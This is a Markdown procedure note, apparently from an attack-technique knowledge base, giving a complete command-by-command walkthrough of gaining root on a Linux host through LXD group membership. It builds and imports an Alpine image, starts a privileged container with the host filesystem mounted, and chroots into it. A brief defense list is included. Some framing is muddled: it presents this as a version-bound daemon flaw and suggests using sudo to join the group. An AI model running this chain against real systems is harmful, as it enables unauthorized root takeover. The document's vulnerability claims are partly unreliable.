---
type: procedure
verified: true
submitted: false
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
tactics:
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - >-
    [[techniques/Exploitation for Privilege Escalation|T1068 - Exploitation for
    Privilege Escalation]]
sub_techniques: []
tags:
  - Linux-Privilege-Escalation
  - LXC
  - LXD
  - Containers
commands:
  - '[[commands/Check-User-ID]]'
  - '[[commands/Clone-LXD-Alpine-Builder]]'
  - '[[commands/Build-Alpine-Image-i686]]'
  - '[[commands/Import-Alpine-Image]]'
  - '[[commands/Init-LXC-Container-Privileged]]'
  - '[[commands/Add-Disk-Device-to-Container]]'
  - '[[commands/Start-LXC-Container]]'
  - '[[commands/Exec-Into-LXC-Container]]'
platforms:
  - Linux
tools: []
validated: true
---

# Linux-Privilege-Escalation-via-LXC-LXD-Alpine-Image

## Summary

This procedure exploits a vulnerability in the LXD daemon to escalate privileges on a Linux host by creating and running a privileged Alpine Linux container image. An unprivileged user with access to the LXD service can build a custom Alpine image, import it, configure it to run in privileged mode, mount the host's root filesystem, and execute commands inside the container to gain root access on the host system.

## Description

LXD is a container manager for Linux that allows users to run system containers. If the LXD daemon is vulnerable (e.g., versions prior to certain patches) and an unprivileged user is added to the lxd group, they can exploit it for privilege escalation. The technique involves building a minimal Alpine Linux image using a builder script, importing it into LXD, initializing a privileged container, mounting the host's root directory into the container, and then interacting with the container to chroot or execute root-level commands on the host. This grants full root access, allowing data exfiltration, persistence, or further lateral movement. The target environment is a Linux system with LXD installed and the user in the lxd group, typically Ubuntu or Debian-based distributions.

## Requirements

1. Unprivileged user account on the target Linux system with membership in the 'lxd' group (check with `id` command).
2. LXD daemon installed and running (version vulnerable to privilege escalation, e.g., pre-3.0.3 in some configs).
3. Internet access to clone the Alpine builder repository.
4. Basic Linux command-line knowledge and tools like git and tar available.

## Defense

- Regularly update LXD to the latest version to patch known vulnerabilities (e.g., ensure subuid/subgid mapping is enforced).
- Restrict membership in the 'lxd' group to trusted administrators only; remove unnecessary users.
- Enable AppArmor or SELinux profiles for LXD to prevent privileged container escapes.
- Monitor LXD logs for suspicious image imports, privileged container creations, or unusual mounts (e.g., via auditd or systemd journaling).
- Disable unprivileged container support if not needed and use nested container restrictions.

## Objectives

1. Verify user privileges and LXD group membership to confirm exploit feasibility.
2. Build and import a custom Alpine image into LXD.
3. Create a privileged container and mount the host root filesystem.
4. Gain root shell access on the host via the container.

## Instructions

### Step 1: Verify User Privileges

**Context**: Confirm the current user's ID and group memberships, particularly checking for 'lxd' group access, which is required to interact with the LXD daemon.

**Command** ([[commands/Check-User-ID]]):
```bash
id
```

> The `id` command displays the real and effective user ID, group ID, and supplementary groups. Look for 'lxd' in the output (e.g., gid=110(lxd)). If absent, add the user to the lxd group with `sudo usermod -aG lxd $USER` and log out/in. Expected output includes group listings confirming LXD access.

### Step 2: Clone LXD Alpine Builder Repository

**Context**: Download the LXD-compatible Alpine image builder script from GitHub to prepare for creating a custom image.

**Command** ([[commands/Clone-LXD-Alpine-Builder]]):
```bash
git clone https://github.com/saghul/lxd-alpine-builder
```

> This clones the repository containing the build-alpine script. Change into the cloned directory afterward (`cd lxd-alpine-builder`). Expected output: Repository cloned successfully with build-alpine script available.

### Step 3: Build Alpine Image

**Context**: Use the builder to create a minimal Alpine Linux image suitable for LXD, targeting i686 architecture for compatibility.

**Command** ([[commands/Build-Alpine-Image-i686]]):
```bash
./build-alpine -a i686
```

> Run this from the lxd-alpine-builder directory. It generates an Alpine tarball (alpine-i686.tar.gz or similar). Expected output: Build completion message and tar.gz file created in the current directory.

### Step 4: Import Alpine Image into LXD

**Context**: Load the built Alpine image into the LXD image store for container creation.

**Command** ([[commands/Import-Alpine-Image]]):
```bash
lxc image import ./alpine-i686.tar.gz --alias alpine-priv-esc
```

> Replace `./alpine-i686.tar.gz` with the actual filename if different. The `--alias` assigns a name for easy reference. Expected output: Image imported successfully with a fingerprint ID displayed.

### Step 5: Initialize Privileged Container

**Context**: Create a new container from the imported image in privileged mode, allowing it to access host resources without restrictions.

**Command** ([[commands/Init-LXC-Container-Privileged]]):
```bash
lxc init alpine-priv-esc priv-esc-container -c security.privileged=true
```

> This initializes the container named 'priv-esc-container' with the privileged security config. Expected output: Container created successfully.

### Step 6: Mount Host Root Filesystem

**Context**: Add a disk device to the container that mounts the host's root directory recursively, exposing the host filesystem inside the container.

**Command** ([[commands/Add-Disk-Device-to-Container]]):
```bash
lxc config device add priv-esc-container root-mount disk source=/ path=/mnt/root recursive=true
```

> This maps the host's `/` to `/mnt/root` in the container. Expected output: Device added successfully.

### Step 7: Start Container and Gain Root Access

**Context**: Launch the container and execute a shell inside it to chroot into the mounted host root and run commands as root.

**Command** ([[commands/Start-LXC-Container]]):
```bash
lxc start priv-esc-container
```

> Starts the container. Expected output: Container started.

**Command** ([[commands/Exec-Into-LXC-Container]]):
```bash
lxc exec priv-esc-container /bin/sh
```

> Enters an interactive shell in the container. Once inside, run `chroot /mnt/root sh` to switch to the host root environment, then execute root commands (e.g., `whoami` should return 'root'). Expected output: Root shell prompt.
